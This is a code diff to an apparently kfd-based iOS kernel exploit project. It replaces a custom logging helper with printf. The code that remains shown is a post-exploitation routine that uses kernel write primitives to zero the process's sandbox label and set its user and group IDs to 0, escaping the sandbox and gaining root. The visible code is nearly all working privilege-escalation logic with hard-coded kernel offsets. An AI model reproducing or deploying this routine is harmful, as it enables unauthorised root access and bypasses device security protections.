@@ -27,49 +27,22 @@ uint64_t off_u_cr_groups = 0x28;
 uint64_t off_u_cr_rgid = 0x68;
 uint64_t off_u_cr_svgid = 0x6c;
 
-NSString* LogString = @"";
-BOOL isLogEnabled = false;
-
-void enableLog(BOOL enable) {
-    isLogEnabled = enable;
-}
-
-void testPrint(void) {
-    kfd_print("test print\n");
-}
-
-void kfd_print(char* format, ...) {
-    va_list args;
-    va_start(args, format);
-    int length = vsnprintf(NULL, 0, format, args);
-    char* result = malloc(length + 1);
-    vsnprintf(result, length + 1, format, args);
-    va_end(args);
-    NSString* string = [NSString stringWithUTF8String: result];
-    if (string) {
-        LogString = [LogString stringByAppendingString: string];
-        if (isLogEnabled) {
-            [[NSNotificationCenter defaultCenter] postNotificationName: @"com.AppInstalleriOS.LogStream" object: LogString];
-        }
-    }
-}
-
 void postExploit(void) {
     uint64_t proc = ((struct kfd*)_kfd)->info.kaddr.current_proc;
     if (proc == -1) {
-        kfd_print("Failed to get proc\n");
+        printf("Failed to get proc\n");
         return;
     }
-    kfd_print("proc: 0x%llx\n", proc);
+    printf("proc: 0x%llx\n", proc);
     uint64_t ucred = kread64(proc + off_p_ucred);
-    kfd_print("ucred: 0x%llx\n", ucred);
+    printf("ucred: 0x%llx\n", ucred);
     uint64_t label = kread64(ucred + off_u_cr_label);
-    kfd_print("label: 0x%llx\n", label);
-    kfd_print("uid: %u\n", kread32(ucred + off_u_cr_uid));
-    kfd_print("sandbox: %u\n", kread64(label + 0x10));
+    printf("label: 0x%llx\n", label);
+    printf("uid: %u\n", kread32(ucred + off_u_cr_uid));
+    printf("sandbox: %u\n", kread64(label + 0x10));
     //Escape Sandbox
     kwrite64(label + 0x10, 0);
-    kfd_print("sandbox: %u\n", kread64(label + 0x10));
+    printf("sandbox: %u\n", kread64(label + 0x10));
     //Get Root
     kwrite32(proc + off_p_uid, 0);
     kwrite32(proc + off_p_ruid, 0);
@@ -82,8 +55,8 @@ void postExploit(void) {
     kwrite32(ucred + off_u_cr_groups, 0);
     kwrite32(ucred + off_u_cr_rgid, 0);
     kwrite32(ucred + off_u_cr_svgid, 0);
-    kfd_print("Done!\n");
-    kfd_print("uid: %u\n", kread32(ucred + off_u_cr_uid));
+    printf("Done!\n");
+    printf("uid: %u\n", kread32(ucred + off_u_cr_uid));
 }
 
 uint64_t getProc(pid_t pid) {
